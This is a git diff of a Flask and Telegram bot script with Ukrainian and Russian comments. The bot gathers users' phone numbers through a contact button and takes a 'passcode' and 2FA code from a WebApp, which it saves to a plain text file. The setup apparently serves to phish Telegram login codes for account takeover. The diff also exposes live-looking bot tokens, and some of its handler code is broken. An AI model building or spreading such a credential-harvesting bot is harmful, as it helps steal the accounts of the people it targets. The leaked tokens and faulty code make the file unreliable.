@@ -4,22 +4,22 @@ from flask import Flask, Blueprint, request, jsonify
 import json
 from telebot import types
 
-TOKEN = "8501545065:AAGgYCuf0tOj-uc74hE9YlDJJJHojbKztrA"
+TOKEN = "8506299686:AAGFB5pH2-NdU4aGQXKyi2FRfX_8r0y_Kts"
 WEBAPP_URL = "https://fairusss.github.io/tgbot/"
 
 app = Flask(__name__)
 
 path_cwd = os.path.dirname(os.path.realpath(__file__))
-path_templates = os.path.join(path_cwd,"templates")
-path_static = os.path.join(path_cwd,"static")
+path_templates = os.path.join(path_cwd, "templates")
+path_static = os.path.join(path_cwd, "static")
 
 Func = Blueprint('func', __name__, static_folder=path_static, template_folder=path_templates)
-@Func.route('/func', methods=['GET','POST'])
-def func():
 
+@Func.route('/func', methods=['GET', 'POST'])
+def func():
     dataGet = '' if not request.get_json(force=True) else request.get_json(force=True)
     print(dataGet)
-    dataReply = {'backend_data':'some_data'}
+    dataReply = {'backend_data': 'some_data'}
     print(dataReply)
     return jsonify(dataReply)
 
@@ -27,7 +27,7 @@ def func():
 def index():
     return "WebApp працює!"
 
-@app.route('/api/data', methods=['GET','POST'])
+@app.route('/api/data', methods=['GET', 'POST'])
 def receive_data():
     data = request.get_json()
     passcode = data.get("passcode")
@@ -48,8 +48,8 @@ def receive_data():
 
     return jsonify({"status": "ok", "saved": saved})
 
-
 bot = telebot.TeleBot(TOKEN)
+
 # /start — показує кнопку з WebApp
 @bot.message_handler(commands=['start'])
 def start(message):
@@ -70,9 +70,29 @@ def start(message):
 @bot.message_handler(content_types=['contact'])
 def handle_webapp_data(message):
     data = message.contact.phone_number
-
-    print(data)
+    print(f"Received phone number: {data}")
     bot.send_message(message.chat.id, f"Отримано номер: {data}")
+
+# Обработка данных, отправленных через WebApp (обновленный обработчик)
+@bot.message_handler(content_types=['web_app_data'])
+def handle_webapp_data(message):
+    try:
+        # Получаем данные, отправленные через setData
+        data = json.loads(message.web_app_data)  # Данные передаются как строка JSON
+        print(f"Received data: {data}")
+
+        # Например, сохраняем passcode
+        passcode = data.get("passcode")
+
+        if passcode:
+            with open("temp_passcode.txt", "w") as f:
+                f.write(passcode)
+            bot.send_message(message.chat.id, f"📄 Код: {passcode} збережено!")
+        else:
+            bot.send_message(message.chat.id, "❌ Код не отримано.")
+    except Exception as e:
+        print(f"Error processing WebApp data: {e}")
+        bot.send_message(message.chat.id, "❌ Помилка при обробці даних.")
 
 # 🟢 AJAX endpoint — WebApp sends passcode / 2FA here
 @app.route("/submit_data", methods=["POST"])
@@ -105,11 +125,8 @@ def get_pass(message):
 
 print("Бот запущено! Очікуємо дані...")
 
-
-
-bot.infinity_polling()  
+bot.infinity_polling()
 
 if __name__ == "__main__":
     port = 12345
-    app.run(host="0.0.0.0", port=port) 
-    
+    app.run(host="0.0.0.0", port=port)
